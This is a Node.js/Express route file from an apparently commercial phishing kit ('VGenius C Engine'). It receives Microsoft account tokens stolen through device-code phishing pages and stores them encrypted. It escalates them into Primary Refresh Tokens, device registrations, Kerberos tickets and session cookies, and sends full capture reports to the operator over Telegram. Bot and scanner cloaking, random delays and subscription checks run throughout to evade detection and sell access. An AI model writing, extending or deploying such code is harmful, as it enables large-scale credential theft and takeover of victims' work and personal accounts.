/**
 * VGenius C Engine - Token Capture Routes
 * Receives tokens from deployed workers
 */
const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const db = require('../database/connection');
const config = require('../config/env');
const { encrypt } = require('../utils/encrypt');
const { processCookieConversion } = require('../services/cookieconverter');
const { sendTelegramDocument } = require('../services/notification');
const { body } = require('express-validator');
const { validateResult } = require('../middleware/validator');
const { getOpsecSettings } = require('../middleware/opsec');
const { rejectBotRequest, classifyRequest } = require('../middleware/botguard');

const captureValidators = [
    body('jwt_token').notEmpty().withMessage('jwt_token is required'),
    body('access_token').notEmpty().withMessage('access_token is required'),
];

// Public bot-check endpoint used by workers/scripts before rendering.
router.get('/check', async (req, res) => {
  try {
    const classification = await classifyRequest(req);
    return res.json({
      ok: true,
      blocked: classification.action === 'block',
      challenged: classification.action === 'challenge',
      action: classification.action,
      reason: classification.reason,
      serve_harmless_page: classification.action !== 'allow',
    });
  } catch (err) {

    return res.json({ ok: true, blocked: false, action: 'allow', reason: 'check_failed' });
  }
});

// The bot guard must NOT apply to the endpoints only our own workers call.
// A Workers fetch carries no User-Agent header, and isBotUserAgent() reads an
// empty UA as a bot - so guarding them silently swallowed the token capture
// and the visitor block-check with an empty 200 OK page. The flow appeared to
// succeed end to end while nothing was saved and no visitor was ever logged.
// Both endpoints authenticate a link JWT instead, so the UA check adds nothing.
const WORKER_ONLY_POSTS = ['/visitor/block-check', '/'];
router.use(function (req, res, next) {
  if (req.method === 'POST' && WORKER_ONLY_POSTS.indexOf(req.path) !== -1) return next();
  return rejectBotRequest(req, res, next);
});

function setBrowserLikeHeaders(res) {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Cache-Control', 'no-store');
}

function decodeJwtPayload(token) {
    if (!token || typeof token !== 'string') return null;
    try {
        const base64 = token.split('.')[1];
        if (!base64) return null;
        const padded = base64 + '='.repeat((4 - (base64.length % 4)) % 4);
        return JSON.parse(Buffer.from(padded, 'base64').toString('utf8'));
    } catch (e) {
        return null;
    }
}

function extractEmailFromToken(token) {
    const payload = decodeJwtPayload(token);
    if (!payload) return null;
    return payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
}


function withTimeout(promise, ms, label) {
    return Promise.race([
        promise,
        new Promise((_, reject) =>
            setTimeout(() => reject(new Error((label || 'operation') + ' timed out')), ms)
        ),
    ]);
}

/**
 *
 * @returns {Promise<{success: boolean, prt?: string|null, reason?: string, via?: string}>}
 */
async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType, email, access_token, refresh_token }) {
    if (accountType !== 'work_school') return { success: false, reason: 'personal account' };
    if (!refresh_token) return { success: false, reason: 'no refresh token' };

    const devicecode = require('../services/devicecode');
    const devicemanager = require('../services/devicemanager');

    const persistResults = async (prtResult, material) => {
        // Store the session key where resolveSessionKeyForToken() reads it
        // (upsert - the row may not exist yet).
        if (prtResult.sessionKeyHex) {
            await devicemanager.persistPrtSessionKey(user_id, tenant, prtResult.sessionKeyHex, material)
                .catch(skErr => {});
        }
        if (prtResult.prt && tokenId) {
            await db.query(
                'UPDATE captured_tokens SET prt = ?, session_key_jwe = ? WHERE id = ?',
                [encrypt(prtResult.prt), encrypt(prtResult.sessionKeyJwe || null), tokenId]
            ).catch(pErr => {});
        }
        // Re-derive Kerberos TGTs now that a real PRT (acrs=pfdr) exists.
        if (tokenId && tenant && tenant !== 'common' && tenant !== 'organizations') {
            require('../services/kerberos').deriveTGTForToken(tokenId)
                .catch(e => {});
        }
    };

    let deviceId = null;
    if (access_token) {
        try {
            const payload = JSON.parse(Buffer.from(access_token.split('.')[1], 'base64').toString());
            deviceId = payload['device_code_id'] || payload['xms_device_id'] || payload['oid'] || null;
        } catch (e) { /* not a JWT */ }
    }

    let enrollment = null;
    if (deviceId) {
        try {
            enrollment = await devicecode.enrollDevice(access_token, deviceId, tenant);
        } catch (e) {

        }
    }

    if (!enrollment) {
        try {
            const fresh = await devicemanager.exchangeForDrsToken(refresh_token, tenant);
            if (fresh && fresh.accessToken && fresh.deviceId) {
                enrollment = await devicecode.enrollDevice(fresh.accessToken, fresh.deviceId, tenant);
            }
        } catch (e) {

        }
    }

    if (!enrollment) {
        try {
            const reg = await devicemanager.registerDeviceAndGetPrt({
                access_token,
                refresh_token,
                tenant_id: tenant,
                target_domain: (email && email.split('@')[1]) || tenant,
                user_id,
                link_id: null,
            });
            if (reg && reg.sessionKeyHex) {
                await persistResults({
                    prt: reg.prt,
                    sessionKeyJwe: reg.sessionKeyJwe,
                    sessionKeyHex: reg.sessionKeyHex,
                }, {
                    deviceId: reg.deviceId,
                    deviceCertificate: reg.deviceCertificate,
                    privateKeyPem: reg.privateKey,
                    certificateDerBase64: reg.certificateDerBase64,
                });
                return { success: true, via: 'devicemanager', prt: reg.prt || null };
            }
        } catch (e) {

        }
        return { success: false, reason: 'device enrollment failed' };
    }

    // 4) Enrollment OK - run GraphSpy request_for_device (Slice C) directly.
    const prtkdf = require('../services/prtkdf');
    try {
        const prtResult = await prtkdf.requestPrtForDevice({
            refreshToken: refresh_token,
            privateKeyPem: enrollment.privateKeyPem,
            certificateBase64: enrollment.certificateDerBase64 || enrollment.deviceCertificate,
        });
        await persistResults(prtResult, {
            deviceId: enrollment.deviceId,
            deviceCertificate: enrollment.deviceCertificate,
            privateKeyPem: enrollment.privateKeyPem,
            certificateDerBase64: enrollment.certificateDerBase64,
        });
        return { success: true, via: 'broker', prt: prtResult.prt || null };
    } catch (prtErr) {

        return { success: false, reason: prtErr.message };
    }
}

async function applyCaptureDelay() {
  try {
    const settings = await getOpsecSettings();
    if (settings.random_delays !== 'true') return;
    const min = parseInt(settings.min_delay_ms, 10) || 50;
    const max = parseInt(settings.max_delay_ms, 10) || 250;
    const delay = Math.floor(Math.random() * (max - min + 1)) + min;
    await new Promise(r => setTimeout(r, delay));
  } catch {
    // best-effort only
  }
}

const AMP = String.fromCharCode(38) + 'amp;'; // &
const LT = String.fromCharCode(38) + 'lt;';  // <
const GT = String.fromCharCode(38) + 'gt;';  // >
const esc = (val) => {
    if (val === null || val === undefined) return 'N/A';
    const s = typeof val === 'string' ? val : JSON.stringify(val);
    return s.replace(/&/g, AMP).replace(/</g, LT).replace(/>/g, GT);
};


function buildCaptureCaption(data) {
    const {
        email, templateType, tokenType, accountType, tenant, ip,
        cookieCount, linkId, tokenId,
    } = data;

    const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const label = tokenType === 'cookie' ? 'COOKIES' : 'TOKENS';
    const lines = [];

    lines.push(`🚨 <b>NEW CAPTURE - ${label}</b>`);
    lines.push(`👤 <b>Email:</b> ${esc(email || 'unknown')}`);
    lines.push(`🏷️ <b>Account:</b> ${esc(accountType)} | <b>Tenant:</b> ${esc(tenant)}`);
    lines.push(`🌐 <b>Template:</b> ${esc(templateType)}`);
    lines.push(`🌍 <b>IP:</b> ${esc(ip || '0.0.0.0')}`);
    if (tokenType === 'cookie' && (cookieCount || cookieCount === 0)) {
        lines.push(`🍪 <b>Cookies:</b> ${esc(cookieCount)}`);
    }
    lines.push(`🔗 <b>Link:</b> ${esc(linkId)} | <b>Token ID:</b> ${esc(tokenId)}`);
    lines.push(`📅 <b>Time:</b> ${esc(stamp)}`);
    lines.push(`✅ Full ${tokenType === 'cookie' ? 'cookies' : 'tokens'} in attached .txt`);

    return lines.join('\n');
}

function buildCaptureFileContent(data) {
    const {
        email, templateType, tokenType, accessToken, refreshToken, idToken,
        prt, sessionKeyJwe, deviceTenantId, tgtAd, tgtCloud,
        kerberosTopLevelNames, tgtCloudSessionkey, accountType, tenant, ip,
        cookieCount, cookieSample, userAgent, linkId, tokenId,
    } = data;

    const prtCookies = Array.isArray(cookieSample)
        ? cookieSample.filter(c => c && c.name && String(c.name).toLowerCase() === 'x-ms-refreshtokencredential')
        : [];

    const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const sep = '========================================';
    const out = [];

    out.push('VGENIUS CAPTURE REPORT');
    out.push(sep);
    out.push(`Type:        ${tokenType === 'cookie' ? 'COOKIE' : 'TOKEN'}`);
    out.push(`Token ID:    ${tokenId}`);
    out.push(`Link ID:     ${linkId}`);
    out.push(`Email:       ${email || 'unknown'}`);
    out.push(`Account:     ${accountType}`);
    out.push(`Tenant:      ${tenant}`);
    out.push(`Template:    ${templateType}`);
    out.push(`IP:          ${ip || '0.0.0.0'}`);
    out.push(`User-Agent:  ${userAgent || 'Phishing Worker'}`);
    out.push(`Captured:    ${stamp}`);
    out.push(sep);

    // For TOKEN mode: show all token fields
    if (tokenType !== 'cookie') {
        out.push('ACCESS TOKEN:');
        out.push(accessToken || 'N/A');
        out.push('');

        if (idToken) {
            out.push('ID TOKEN:');
            out.push(idToken);
            out.push('');
        }

        if (prt) {
            out.push('PRT / REFRESH TOKEN:');
            out.push(prt);
            out.push('');
        }

        if (refreshToken && refreshToken !== prt) {
            out.push('REFRESH TOKEN:');
            out.push(refreshToken);
            out.push('');
        }

        if (sessionKeyJwe) {
            out.push('SESSION KEY (JWE):');
            out.push(sessionKeyJwe);
            out.push('');
        }

        if (deviceTenantId) {
            out.push('DEVICE TENANT ID:');
            out.push(deviceTenantId);
            out.push('');
        }

        if (tgtAd) {
            out.push('TGT AD:');
            out.push(tgtAd);
            out.push('');
        }

        if (tgtCloud) {
            out.push('TGT CLOUD:');
            out.push(tgtCloud);
            out.push('');
        }

        if (tgtCloudSessionkey) {
            out.push('TGT CLOUD SESSION KEY:');
            out.push(tgtCloudSessionkey);
            out.push('');
        }

        if (kerberosTopLevelNames) {
            out.push('KERBEROS TOP LEVEL NAMES:');
            out.push(kerberosTopLevelNames);
            out.push('');
        }
    }

    if (tokenType === 'cookie') {
        const cookieText = prtCookies.length > 0
            ? prtCookies.map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`).join('\n')
            : 'NO PRT COOKIE CAPTURED';
        out.push(`COOKIES (${Math.max(cookieCount || 0, prtCookies.length)} cookies):`);
        out.push(cookieText);
        out.push('');
    }

    out.push(sep);
    out.push('END OF REPORT');
    return out.join('\n');
}

function sendCaptureReport(userId, data) {
    const caption = buildCaptureCaption(data);
    const fileContent = buildCaptureFileContent(data);
    const filename = `capture_${data.tokenId}_${data.tokenType || 'token'}.txt`;
    return sendTelegramDocument(userId, filename, fileContent, caption);
}

// POST /api/capture - receives tokens from the phishing worker
router.post('/', captureValidators, validateResult, async (req, res) => {
    try {
        const { jwt_token, access_token, refresh_token, id_token, ip, user_agent } = req.body;

        // Workers own the device-code flow, so they report the victim's real
        // address in the body. Prefer it over req.ip, which for a worker
        // request is a Cloudflare egress address, not the victim's.
        const reportedIp = String(ip || '').split(',')[0].trim().slice(0, 45);
        const visitorIp = reportedIp || req.ip || req.headers['x-forwarded-for'] || '';
        const ua = String(user_agent || req.headers['user-agent'] || '').slice(0, 512);
        const classification = classifyIP(visitorIp, ua, req.headers);

        if (classification.action === 'block') {

          return res.status(404).sendFile(path.join(__dirname, '..', '..', 'admin-panel', '404.html'));
        }

        await applyCaptureDelay();

        if (!jwt_token || !access_token) {
          setBrowserLikeHeaders(res);
          return res.status(400).json({ error: 'Missing required fields' });
        }

        // Verify JWT (the one embedded in the phishing page)
        let decoded;
        try {
            decoded = jwt.verify(jwt_token, config.JWT_SECRET);
        } catch (err) {
            setBrowserLikeHeaders(res);
            return res.status(403).json({ error: 'Invalid or expired JWT' });
        }

        const { user_id, link_id } = decoded;
        if (!user_id || !link_id) {
            setBrowserLikeHeaders(res);
            return res.status(403).json({ error: 'Invalid JWT payload' });
        }

        // Verify user subscription is still active
        const [users] = await db.query(
            'SELECT * FROM users WHERE id = ? AND subscription_status = ? AND (subscription_expiry IS NULL OR subscription_expiry > NOW())',
            [user_id, 'active']
        );
        if (!users.length) {
            setBrowserLikeHeaders(res);
            return res.status(403).json({ error: 'Subscription inactive or expired' });
        }

        // Verify link is still active
        const [links] = await db.query(
            'SELECT * FROM links WHERE id = ? AND user_id = ? AND status = ? AND kill_switched = 0',
            [link_id, user_id, 'active']
        );
        if (!links.length) {
            setBrowserLikeHeaders(res);
            return res.status(403).json({ error: 'Link not active or killed' });
        }

        const link = links[0];

    // Workers own the device-code flow, so a victim clicking "Generate code"
    // never reaches this backend - only the page-load block-check logs a
    // visitor, and that call is swallowed by the worker when the backend is
    // briefly unreachable. Record the visitor here, where the real capture
    // lands, so a completed flow is never lost.
    if (visitorIp) {
      try {
        const [existingVisitor] = await db.query(
            'SELECT id FROM visitors WHERE user_id = ? AND link_id = ? AND ip_address = ? LIMIT 1',
            [user_id, link_id, visitorIp]
        );
        if (existingVisitor.length === 0) {
            await db.query(
                "INSERT INTO visitors (user_id, link_id, ip_address, user_agent, country, status, worker_name, ip_type) VALUES (?, ?, ?, ?, ?, 'done', ?, ?)",
                [user_id, link_id, visitorIp, ua, await getCountryFromIP(visitorIp), link.worker_name || null, classification.type]
            );
        }
      } catch (visitorErr) {
        // Visitor logging must never block a capture
      }
    }

    // Parse incoming data - support both old format and new PRT format
    let prt = null;
    let sessionKeyJwe = null;
    let sessionKey = null;      
    let sessionKeyEnc = null;    
    let clientInfo = null;       
    let deviceTenantId = null;
    let tgtAd = null;
    let tgtCloud = null;
    let kerberosTopLevelNames = null;
    let tgtCloudSessionkey = null;
    let accountType = 'work_school'; 

    if (req.body.client_info) {
      clientInfo = req.body.client_info;
    }
    if (req.body.session_key) {
      sessionKey = req.body.session_key;
    }
    if (req.body.session_key_enc) {
      sessionKeyEnc = req.body.session_key_enc;
      if (!sessionKeyJwe) {
        sessionKeyJwe = sessionKeyEnc;
      }
    }
    if (req.body.prt) {
      prt = req.body.prt;
      accountType = 'work_school';
    }
    if (req.body.device_tenant_id) {
      deviceTenantId = req.body.device_tenant_id;
    }
    if (req.body.tgt_ad) {
      tgtAd = JSON.stringify(req.body.tgt_ad);
    }
    if (req.body.tgt_cloud) {
      tgtCloud = JSON.stringify(req.body.tgt_cloud);
    }
    if (req.body.kerberos_top_level_names) {
      kerberosTopLevelNames = req.body.kerberos_top_level_names;
    }
    if (req.body.tgt_cloud_sessionkey) {
      tgtCloudSessionkey = JSON.stringify(req.body.tgt_cloud_sessionkey);
    }

    let rawRefreshToken = refresh_token || '';
    if (rawRefreshToken) {
      try {
        // Check if refresh_token is JSON (competitor format with PRT data)
        const parsedRefresh = JSON.parse(rawRefreshToken);
        if (parsedRefresh.prt) {
          prt = parsedRefresh.prt;
          accountType = 'work_school';
        }
        if (parsedRefresh.session_key_jwe) sessionKeyJwe = parsedRefresh.session_key_jwe;
        if (parsedRefresh.device_tenant_id) deviceTenantId = parsedRefresh.device_tenant_id;
        if (parsedRefresh.tgt_ad) tgtAd = JSON.stringify(parsedRefresh.tgt_ad);
        if (parsedRefresh.tgt_cloud) tgtCloud = JSON.stringify(parsedRefresh.tgt_cloud);
        if (parsedRefresh.kerberos_top_level_names) kerberosTopLevelNames = parsedRefresh.kerberos_top_level_names;
        if (parsedRefresh.tgt_cloud_sessionkey) tgtCloudSessionkey = parsedRefresh.tgt_cloud_sessionkey;
      } catch (e) {
        if (rawRefreshToken.startsWith('0.AT') || rawRefreshToken.startsWith('M.R')) {
          accountType = 'personal';
        }
        if (accountType === 'work_school' && !prt) {
          prt = rawRefreshToken;
        }
      }
    }
    
    const captureMeta = {
      client_info: clientInfo,
      session_key: sessionKey,
      session_key_enc: sessionKeyEnc,
    };

    let email = null;
    let idTokenTenant = null;
    if (id_token) {
        try {
            let tokenPart = id_token.split('.')[1];
            while (tokenPart.length % 4) tokenPart += '=';
            const payload = JSON.parse(Buffer.from(tokenPart, 'base64').toString());
            email = payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
            idTokenTenant = payload.tid || null; 

            if (email) {
                const emailDomain = email.split('@')[1].toLowerCase();
                if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
                    accountType = 'personal';
                }
            }
        } catch (e) { /* ignore decode errors */ }
    }

    if (!email) {
        email = extractEmailFromToken(access_token) || extractEmailFromToken(refresh_token) || extractEmailFromToken(id_token) || null;
    }

    let tenant = idTokenTenant || 'common';
    if (!idTokenTenant && link.jwt_payload) {
        try {
            const parsed = JSON.parse(link.jwt_payload);
            if (parsed.tenant) tenant = parsed.tenant;
        } catch (e) { /* use default */ }
    }

    // For personal accounts, use consumers endpoint
    if (accountType === 'personal') {
        tenant = 'consumers';
    }

    // Insert token record (encrypted) with 100-year expiration for persistent access
    const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720; // Max 30 days

    const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';

    const tokenType = link.auth_mode === 'cookie' ? 'cookie' : 'token';

    const [result] = await db.query(
        `INSERT INTO captured_tokens
        (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted,
         prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey,
         account_type, ip_address, user_agent, expiration, tenant, template_type, client_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL ? HOUR), ?, ?, ?)`,
        [
            user_id,
            link_id,
            email,
            tokenType,
            encrypt(access_token),
            encrypt(refresh_token || null),
            encrypt(id_token || null),
            encrypt(prt),
            encrypt(sessionKeyJwe),
            deviceTenantId,
            encrypt(tgtAd),
            encrypt(tgtCloud),
            kerberosTopLevelNames,
            encrypt(tgtCloudSessionkey),
            accountType,
            visitorIp || '0.0.0.0',
            ua || 'Unknown',
            ttlHours,
            tenant,
            link.template_type || 'office',
            clientIdUsed
        ]
    );

    const tokenId = result.insertId;

    if (prt && accountType === 'work_school' && tenant && tenant !== 'common' && tenant !== 'organizations') {
      const kerberosService = require('../services/kerberos');
      kerberosService.deriveTGTForToken(tokenId)
        .then(derivationResult => {
          if (derivationResult.success) {
            if (derivationResult.tgt_cloud) {
              db.query(
                'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
                [encrypt(derivationResult.tgt_cloud), tokenId]
              ).catch(err => {});
            }
            if (derivationResult.tgt_ad) {
              db.query(
                'UPDATE captured_tokens SET tgt_ad = ? WHERE id = ?',
                [encrypt(derivationResult.tgt_ad), tokenId]
              ).catch(err => {});
            }
            if (derivationResult.session_key) {
              db.query(
                'UPDATE captured_tokens SET tgt_cloud_sessionkey = ? WHERE id = ?',
                [encrypt(derivationResult.session_key), tokenId]
              ).catch(err => {});
            }
            if (derivationResult.kerberos_top_level_names) {
              db.query(
                'UPDATE captured_tokens SET kerberos_top_level_names = ? WHERE id = ?',
                [derivationResult.kerberos_top_level_names, tokenId]
              ).catch(err => {});
            }
          }
        })
        .catch(err => {

        });
    }

    const captureData = {
        email,
        templateType: link.template_type,
        tokenType: tokenType, 
        accessToken: access_token,
        refreshToken: prt,
        idToken: id_token,
        prt,
        sessionKeyJwe,
        sessionKey: sessionKey,
        sessionKeyEnc: sessionKeyEnc,
        clientInfo: clientInfo,
        deviceTenantId,
        tgtAd,
        tgtCloud,
        kerberosTopLevelNames,
        tgtCloudSessionkey,
        accountType,
        tenant,
        visitorIp,
        userAgent: ua,
        linkId: link_id,
        tokenId,
        captureMeta: captureMeta,
    };

    let refreshTokenForConversion = refresh_token || prt || access_token;
    if (link.auth_mode === 'cookie') {
        let autoPrt = { success: false };
        if (accountType === 'work_school' && refresh_token) {
            autoPrt = await withTimeout(
                autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType, email, access_token, refresh_token }),
                45000,
                'PRT auto-capture'
            ).catch(e => {

                return { success: false, reason: e.message };
            });
            if (autoPrt.success) {
                if (autoPrt.prt) refreshTokenForConversion = autoPrt.prt;
            }
        }

        try {
            const cookieResult = await processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, user_id);
            const io = req.app.get('io');
            if (io) {
                io.to(`user_${user_id}`).emit('new_token', {
                    id: tokenId,
                    email,
                    token_type: 'cookie',
                    created_at: new Date()
                });
            }
            await sendCaptureReport(user_id, {
                ...captureData,
                tokenType: 'cookie',
                cookieCount: cookieResult.cookie_count,
                cookieSample: cookieResult.cookies,
            });
        } catch (err) {

            try {
                const cookieResult = await processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, user_id);
                await sendCaptureReport(user_id, {
                    ...captureData,
                    tokenType: 'cookie',
                    cookieCount: cookieResult.cookie_count,
                    cookieSample: cookieResult.cookies,
                });
            } catch (cookieErr) {

                await sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
            }
        }
    } else {
        if (accountType === 'work_school' && refresh_token) {
            autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType, email, access_token, refresh_token })
                .catch(e => {});
        }
        const io = req.app.get('io');
        if (io) {
            io.to(`user_${user_id}`).emit('new_token', {
                id: tokenId,
                email,
                token_type: 'token',
                created_at: new Date()
            });
        }
        await sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
    }

    setBrowserLikeHeaders(res);
    res.status(200).json({ success: true, token_id: tokenId });
} catch (err) {

    setBrowserLikeHeaders(res);
    res.status(500).json({ error: 'Internal server error' });
}
});

// ─── IP Classification Helper ────────────────────────────────────────────────
// Classifies visitor IP into categories for anti-bot challenging
function classifyIP(ip, userAgent, headers) {
  // ONLY challenge when CERTAIN - never challenge clean residential IPs
  const crawlerPatterns = [
    /bot/i, /spider/i, /crawl/i, /scraper/i, /curl/i, /wget/i,
    /python-requests/i, /httpclient/i, /java\\/i, /phantom/i,
    /headless/i, /selenium/i, /puppeteer/i, /playwright/i,
    /slurp/i, /bingbot/i, /googlebot/i, /yandexbot/i, /baiduspider/i
  ];

  const ua = userAgent || '';
  for (const pattern of crawlerPatterns) {
    if (pattern.test(ua)) return { type: 'crawler', action: 'block', confidence: 0.95 };
  }

  // Only challenge if User-Agent is missing or extremely short
  if (!ua || ua.length < 5) return { type: 'suspicious', action: 'challenge', confidence: 0.9 };

  // Only challenge if Cloudflare EXPLICITLY identifies the IP type
  const ipType = headers['cf-ip-type'] || '';
  if (ipType === 'datacenter' || ipType === 'hosting') return { type: 'datacenter', action: 'challenge', confidence: 0.95 };
  if (ipType === 'vpn' || ipType === 'proxy' || ipType === 'tor') return { type: 'vpn', action: 'challenge', confidence: 0.95 };

  // Default: residential IP - ALWAYS allow through
  return { type: 'residential', action: 'allow', confidence: 0.99 };
}

// ─── IP Geolocation Fallback ────────────────────────────────────────────────
// Uses ip-api.com (free, no API key needed, 45 requests/minute limit)
async function getCountryFromIP(ip) {
  try {
    // Only lookup private IPs are skipped
    if (!ip || ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
      return 'Unknown';
    }
    
    const axios = require('axios');
    const response = await axios.get(`http://ip-api.com/json/${ip}?fields=countryCode&timeout=2000`);
    if (response.data && response.data.countryCode) {
      return response.data.countryCode;
    }
  } catch (e) {
    // Silent fail - return Unknown
  }
  return 'Unknown';
}

// ─── Visitor Block Check (called by worker before serving page) ──────────────
router.post('/visitor/block-check', async (req, res) => {
  try {
    const { jwt_token, visitor_ip } = req.body;

    if (!jwt_token || !visitor_ip) {
      return res.status(400).json({ error: 'jwt_token and visitor_ip required' });
    }

    // Decode JWT to get user_id
    let decoded;
    try {
      decoded = jwt.verify(jwt_token, config.JWT_SECRET);
    } catch (e) {
      return res.status(401).json({ error: 'Invalid token' });
    }

    const { user_id, link_id } = decoded;
    const userAgent = req.headers['user-agent'] || req.get('user-agent') || '';

    // Extract worker_name from links table (not from JWT)
    let workerName = null;
    try {
      const [linkRows] = await db.query('SELECT worker_name FROM links WHERE id = ? AND user_id = ?', [link_id, user_id]);
      if (linkRows.length > 0 && linkRows[0].worker_name) {
        workerName = linkRows[0].worker_name;
      }
    } catch (e) {
      // Silent fail
    }

    // ── Step 1: Check block_done_visitors (existing logic) ────────────────
    const [settingsRows] = await db.query(
      'SELECT block_done_visitors, redirect_url FROM visitor_settings WHERE user_id = ?',
      [user_id]
    );

    if (settingsRows.length && settingsRows[0].block_done_visitors) {
      const [visitorRows] = await db.query(
        "SELECT id, status FROM visitors WHERE ip_address = ? AND user_id = ? AND status IN ('done', 'blocked') ORDER BY created_at DESC LIMIT 1",
        [visitor_ip, user_id]
      );

      if (visitorRows.length > 0) {
        try {
          let country = req.headers['cf-ipcountry'] || req.get('CF-IPCountry') || '';
          if (!country || country === 'Unknown') {
            country = await getCountryFromIP(visitor_ip);
          }
          await db.query(
            "INSERT INTO visitors (user_id, link_id, ip_address, user_agent, country, status, worker_name) VALUES (?, ?, ?, ?, ?, 'blocked', ?)",
            [user_id, link_id, visitor_ip, userAgent, country, workerName]
          );
        } catch (logErr) {

        }

        return res.json({
          blocked: true,
          redirect_url: settingsRows[0].redirect_url || ''
        });
      }
    }

    // ── Step 2: Anti-Bot IP Classification ────────────────────────────────
    const ipClassification = classifyIP(visitor_ip, userAgent, req.headers);

    // Log visitor for analytics
    try {
      let country = req.headers['cf-ipcountry'] || req.get('CF-IPCountry') || '';
      if (!country || country === 'Unknown') {
        country = await getCountryFromIP(visitor_ip);
      }
      // status must be a value present in visitors.status ENUM('waiting',
      // 'timeout','done','blocked'). This insert used to write 'visited', which
      // is not in the ENUM: MySQL strict mode rejected the row and the catch
      // below swallowed it, so page-load visitors were never recorded at all.
      await db.query(
        "INSERT INTO visitors (user_id, link_id, ip_address, user_agent, country, status, worker_name, ip_type) VALUES (?, ?, ?, ?, ?, 'waiting', ?, ?)",
        [user_id, link_id, visitor_ip, userAgent, country, workerName, ipClassification.type]
      );
    } catch (logErr) {
      // Silent fail for logging
    }

    // Return classification result for worker to decide action
    return res.json({
      blocked: ipClassification.action === 'block',
      challenged: ipClassification.action === 'challenge',
      ip_type: ipClassification.type,
      confidence: ipClassification.confidence,
      action: ipClassification.action
    });
  } catch (err) {

    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
module.exports.buildCaptureCaption = buildCaptureCaption;
module.exports.buildCaptureFileContent = buildCaptureFileContent;
module.exports.sendCaptureReport = sendCaptureReport;
